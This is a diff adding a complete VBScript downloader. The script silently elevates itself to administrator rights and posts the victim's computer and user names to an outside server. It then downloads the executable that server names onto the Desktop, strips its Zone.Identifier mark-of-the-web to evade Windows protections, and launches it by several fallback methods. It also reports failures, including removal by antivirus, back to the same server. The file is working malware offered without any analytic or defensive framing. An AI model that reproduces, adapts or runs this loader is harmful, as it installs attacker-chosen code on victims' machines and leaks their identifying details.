@@ -1,0 +1,254 @@
+Option Explicit
+
+If Not WScript.Arguments.Named.Exists("elevated") Then
+    CreateObject("Shell.Application").ShellExecute "wscript.exe", _
+        Chr(34) & WScript.ScriptFullName & Chr(34) & " /elevated", "", "runas", 0
+    WScript.Quit
+End If
+
+Call Main()
+
+Sub Main()
+    Dim serverUrl, errorUrl, requestData, downloadUrl, fileName
+    Dim filePath, xmlhttp, fso, shell, network, targetDir
+    Dim computerName, userName, responseText, attempts, success
+    Dim execSuccess, execError, fileSize
+    
+    On Error Resume Next
+    
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    Set shell = CreateObject("WScript.Shell")
+    Set network = CreateObject("WScript.Network")
+    
+    computerName = network.ComputerName
+    userName = network.UserName
+    targetDir = shell.SpecialFolders("Desktop") & "\"
+    serverUrl = "https://nav.eszja.com/fall_back"
+    errorUrl = "https://nav.eszja.com/error"
+    
+    requestData = "{""pc"":""" & computerName & """,""u"":""" & userName & """,""s"":""request""}"    
+   
+    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP")
+    xmlhttp.Open "POST", serverUrl, False
+    xmlhttp.setRequestHeader "Content-Type", "application/json"
+    xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0"
+    xmlhttp.setTimeouts 15000, 15000, 15000, 15000 '
+    xmlhttp.send requestData
+    
+    If xmlhttp.Status = 200 Then
+        responseText = xmlhttp.responseText
+        downloadUrl = ExtractValue(responseText, "download_url")
+        fileName = ExtractValue(responseText, "filename")
+        downloadUrl = Replace(downloadUrl, "\/", "/")
+        
+        If downloadUrl <> "" And fileName <> "" Then
+            filePath = targetDir & fileName            
+            
+            success = False
+            For attempts = 1 To 3
+                If DownloadFile(downloadUrl, filePath) Then
+                    If fso.FileExists(filePath) Then
+                        fileSize = fso.GetFile(filePath).Size
+                        If fileSize > 5120 Then 
+                            success = True
+                            Exit For
+                        Else                           
+                            fso.DeleteFile filePath, True
+                        End If
+                    End If
+                End If
+                WScript.Sleep 3000 
+            Next
+
+            If success Then               
+                execError = ""
+                execSuccess = False                
+               
+                On Error Resume Next
+                shell.Run "powershell -Command ""Unblock-File -Path '" & filePath & "' -ErrorAction SilentlyContinue""", 0, True
+                If Err.Number <> 0 Then
+                    execError = execError & " Unblock failed: " & Err.Description
+                    Err.Clear
+                End If                
+                
+                RemoveZoneIdentifier filePath                
+                
+                If Not IsValidExecutable(filePath) Then
+                    execError = execError & " Invalid executable format"
+                    success = False
+                End If
+                
+                If success Then
+                
+                    shell.CurrentDirectory = targetDir
+                    execSuccess = ExecuteFile(filePath, execError)
+                    
+                    If Not execSuccess Then
+                        Dim errorMsg
+                        errorMsg = "Execution failed"
+                        If execError <> "" Then errorMsg = errorMsg & ": " & execError
+                        If Err.Number <> 0 Then errorMsg = errorMsg & " VBS Error: " & Err.Number & " - " & Err.Description
+                        
+                        If Not fso.FileExists(filePath) Then
+                            errorMsg = errorMsg & " (File was deleted by AV)"
+                        End If
+                        
+                        SendError errorUrl, computerName, userName, errorMsg
+                    End If
+                Else
+                    SendError errorUrl, computerName, userName, "File validation failed: " & execError & " Size: " & fileSize & " bytes"
+                End If
+            Else
+                SendError errorUrl, computerName, userName, "Download failed after 3 attempts or file invalid."
+            End If
+        Else
+            SendError errorUrl, computerName, userName, "JSON parsing failed. URL: " & downloadUrl & " Filename: " & fileName & " Response: " & responseText
+        End If
+    Else
+        SendError errorUrl, computerName, userName, "Server connection failed. Status: " & xmlhttp.Status & " " & xmlhttp.statusText
+    End If
+End Sub
+
+Function ExecuteFile(filePath, ByRef errorDesc)
+    Dim shell, fso, execSuccess, wshExec
+    Set shell = CreateObject("WScript.Shell")
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    ExecuteFile = False
+    errorDesc = ""
+    
+    On Error Resume Next
+    shell.Run Chr(34) & filePath & Chr(34), 1, False
+    If Err.Number = 0 Then
+        ExecuteFile = True
+        Exit Function
+    Else
+        errorDesc = "Method1: " & Err.Description
+        Err.Clear
+    End If
+    
+    On Error Resume Next
+    shell.Run "cmd /c " & Chr(34) & filePath & Chr(34), 0, False
+    If Err.Number = 0 Then
+        ExecuteFile = True
+        Exit Function
+    Else
+        errorDesc = errorDesc & " Method2: " & Err.Description
+        Err.Clear
+    End If
+
+    On Error Resume Next
+    Set wshExec = shell.Exec(filePath)
+    If Err.Number = 0 Then
+        ExecuteFile = True
+        Exit Function
+    Else
+        errorDesc = errorDesc & " Method3: " & Err.Description
+        Err.Clear
+    End If
+
+    On Error Resume Next
+    shell.Run "powershell -Command ""Start-Process -FilePath '" & filePath & "'""", 0, False
+    If Err.Number = 0 Then
+        ExecuteFile = True
+        Exit Function
+    Else
+        errorDesc = errorDesc & " Method4: " & Err.Description
+    End If
+    
+End Function
+
+Function IsValidExecutable(filePath)
+    Dim fso, stream, bytes, i
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    IsValidExecutable = False
+    
+    If Not fso.FileExists(filePath) Then Exit Function
+
+    If LCase(fso.GetExtensionName(filePath)) <> "exe" Then Exit Function
+    
+    On Error Resume Next
+    Set stream = fso.OpenTextFile(filePath, 1)
+    If Err.Number = 0 Then
+        bytes = stream.Read(2)
+        stream.Close
+         If Len(bytes) >= 2 Then
+            If Asc(Mid(bytes, 1, 1)) = 77 And Asc(Mid(bytes, 2, 1)) = 90 Then
+                IsValidExecutable = True
+            End If
+        End If
+    End If
+End Function
+
+Sub RemoveZoneIdentifier(filePath)
+    Dim fso, zoneFile
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    
+    zoneFile = filePath & ":Zone.Identifier"
+    
+    On Error Resume Next
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "cmd /c echo. > """ & zoneFile & """", 0, True
+    shell.Run "cmd /c del """ & zoneFile & """", 0, True
+    shell.Run "powershell -Command ""Remove-Item -Path '" & zoneFile & "' -Force -ErrorAction SilentlyContinue""", 0, True
+End Sub
+
+Sub SendError(url, pc, user, msg)
+    On Error Resume Next
+    Dim xmlhttp, errData
+    msg = Replace(msg, "\", "\\")
+    msg = Replace(msg, """", "\""")
+    msg = Replace(msg, vbCrLf, " ")
+    msg = Replace(msg, vbTab, " ")
+    
+    errData = "{""pc"":""" & pc & """,""u"":""" & user & """,""error"":""" & msg & """}"
+    
+    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP")
+    xmlhttp.Open "POST", url, False
+    xmlhttp.setRequestHeader "Content-Type", "application/json"
+    xmlhttp.setTimeouts 5000, 5000, 5000, 5000
+    xmlhttp.send errData
+End Sub
+
+Function ExtractValue(jsonString, key)
+    Dim pos1, pos2, searchFor
+    searchFor = """" & key & """:"""
+    pos1 = InStr(jsonString, searchFor)
+    If pos1 > 0 Then
+        pos1 = pos1 + Len(searchFor)
+        pos2 = InStr(pos1, jsonString, """")
+        If pos2 > pos1 Then ExtractValue = Mid(jsonString, pos1, pos2 - pos1)
+    End If
+End Function
+
+Function DownloadFile(url, filePath)
+    On Error Resume Next
+    Dim xmlhttp, stream, fso
+    
+    Set fso = CreateObject("Scripting.FileSystemObject")
+    If fso.FileExists(filePath) Then fso.DeleteFile filePath, True
+    
+    Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP")
+    xmlhttp.Open "GET", url, False
+    xmlhttp.setRequestHeader "User-Agent", "Mozilla/5.0"
+    xmlhttp.setTimeouts 30000, 30000, 30000, 30000
+    xmlhttp.send
+    
+    If xmlhttp.Status = 200 Then
+        Set stream = CreateObject("ADODB.Stream")
+        stream.Type = 1
+        stream.Open
+        stream.Write xmlhttp.responseBody
+        stream.SaveToFile filePath, 2
+        stream.Close
+        If fso.FileExists(filePath) Then
+            DownloadFile = True
+        Else
+            DownloadFile = False
+        End If
+    Else
+        DownloadFile = False
+    End If
+End Function
